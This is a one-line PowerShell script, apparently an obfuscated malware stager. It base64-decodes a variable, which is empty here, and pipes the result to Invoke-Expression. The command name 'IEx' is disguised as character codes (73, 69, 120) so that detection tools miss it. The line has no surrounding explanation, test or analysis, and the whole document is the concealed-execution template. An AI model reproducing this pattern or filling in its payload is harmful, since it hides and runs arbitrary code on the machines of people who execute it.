$YMCFH="";$AQXYNM=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($YMCFH));$AQXYNM|&([char]73+[char]69+[char]120)